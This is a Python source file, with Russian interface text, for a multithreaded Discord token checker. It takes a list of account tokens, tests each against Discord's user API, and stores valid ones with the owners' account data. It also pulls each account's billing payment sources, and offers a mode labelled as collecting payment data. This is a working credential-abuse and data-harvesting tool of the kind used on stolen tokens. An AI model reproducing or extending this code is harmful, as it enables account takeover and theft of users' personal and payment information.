from modules import config, visual, utils
from datetime import datetime
from typing import List
from queue import Queue
import threading
import json
import os


class TokenChecker:
    def __init__(self) -> None:
        self.tokens = self.split_tokens()
        self.results_queue = Queue()
        self.threads = []
        self.valid_tokens_file = "output/valid/tokens.json"
        self.invalid_tokens_file = "output/invalid/tokens.json"
        self.valid_tokens = []
        self.invalid_tokens = []

        self.configure()

    def configure(self) -> None:
        # Ensure output directories exist
        os.makedirs("output/valid", exist_ok=True)
        os.makedirs("output/invalid", exist_ok=True)

        modes = [
            "По умолчанию",
            "Сбор платежных данных",
        ]
        for num, mode in enumerate(modes, start=1):
            visual.Visual.info(f"[{num}] {mode}")
        self.mode = visual.Visual.choice("Выберите режим")

        self.check_tokens()

    def split_tokens(self) -> list:
        visual.Visual.info(
            f"Разделение {len(config.Config.tokens)} токенов на {config.Config.thread_count} потоков"
        )
        avg_len = len(config.Config.tokens) // config.Config.thread_count
        remainder = len(config.Config.tokens) % config.Config.thread_count
        result = []
        start = 0

        for i in range(config.Config.thread_count):
            end = start + avg_len + (1 if i < remainder else 0)
            part = config.Config.tokens[start:end]
            if part and part[0]:
                result.append(part)
            start = end

        return result

    def save_valid_token(self, token: str, user_data: dict):
        self.valid_tokens.append(
            {
                "token": token,
                "user_data": user_data,
                "validated_at": datetime.now().isoformat(),
            }
        )
        visual.Visual.success(
            f"Валидный токен для пользователя {user_data.get('username', 'unknown')}"
        )

    def save_invalid_token(
        self, token: str, status_code: int, error_msg: str = None
    ) -> None:
        self.invalid_tokens.append(
            {
                "token": token,
                "status_code": status_code,
                "error": error_msg,
                "checked_at": datetime.now().isoformat(),
            }
        )
        visual.Visual.error(f"Невалидный токен: {token[:10]}...")

    def save_results(self) -> None:
        valid_data = {}
        for token_data in self.valid_tokens:
            valid_data[token_data["token"]] = {
                "user_data": token_data["user_data"],
                "validated_at": token_data["validated_at"],
            }

        with open(self.valid_tokens_file, "w") as f:
            json.dump(valid_data, f, indent=4)

        invalid_data = {}
        for token_data in self.invalid_tokens:
            invalid_data[token_data["token"]] = {
                "status_code": token_data["status_code"],
                "error": token_data["error"],
                "checked_at": token_data["checked_at"],
            }

        with open(self.invalid_tokens_file, "w") as f:
            json.dump(invalid_data, f, indent=4)

        visual.Visual.success(
            f"Сохранено {len(self.valid_tokens)} валидных и {len(self.invalid_tokens)} невалидных токенов"
        )

    def check_token(self, tokens: List[str], thread_id: int) -> None:
        visual.Visual.debug(f"Поток {thread_id}: Начало проверки {len(tokens)} токенов")

        session = utils.Utils.get_session()
        if not hasattr(config.Config, "proxies") or not config.Config.proxies:
            visual.Visual.debug(f"Поток {thread_id}: Работа без прокси")

        for token in tokens:
            try:
                headers = utils.Utils.get_default_headers(token)
                visual.Visual.debug(
                    f"Поток {thread_id}: Проверка токена {token[:10]}..."
                )

                data = session.get(
                    "https://discord.com/api/v9/users/@me", headers=headers
                )

                user_data = data.json()

                if data.status_code == 200:
                    visual.Visual.success(
                        f"Поток {thread_id}: Валидный токен {token[:10]}... Пользователь: {user_data.get('username')}"
                    )
                    self.save_valid_token(token, user_data)
                else:
                    visual.Visual.error(
                        f"Поток {thread_id}: Невалидный токен {token[:10]}... Статус: {data.status_code}"
                    )
                    self.save_invalid_token(token, data.status_code)

                bill = session.get(
                    "https://discord.com/api/v9/users/@me/billing/payment-sources",
                    headers=headers,
                )
                user_data["billing"] = bill.json()

                self.results_queue.put(
                    {"token": token, "status": data.status_code, "data": user_data}
                )

            except Exception as e:
                visual.Visual.error(
                    f"Поток {thread_id}: Ошибка проверки токена {token[:10]}...: {str(e)}"
                )
                self.save_invalid_token(token, 0, str(e))
                self.results_queue.put(
                    {"token": token, "status": "error", "error": str(e)}
                )

    def check_tokens(self) -> List[dict]:
        visual.Visual.info("Начало процесса проверки токенов")

        for thread_id, token_batch in enumerate(self.tokens):
            thread = threading.Thread(
                target=self.check_token, args=(token_batch, thread_id)
            )
            self.threads.append(thread)
            thread.start()
            visual.Visual.debug(
                f"Запущен поток {thread_id} с {len(token_batch)} токенами"
            )

        for thread in self.threads:
            thread.join()

        results = []
        while not self.results_queue.empty():
            results.append(self.results_queue.get())

        self.save_results()

        visual.Visual.success(
            f"Проверка всех токенов завершена. Всего результатов: {len(results)}"
        )
        return results
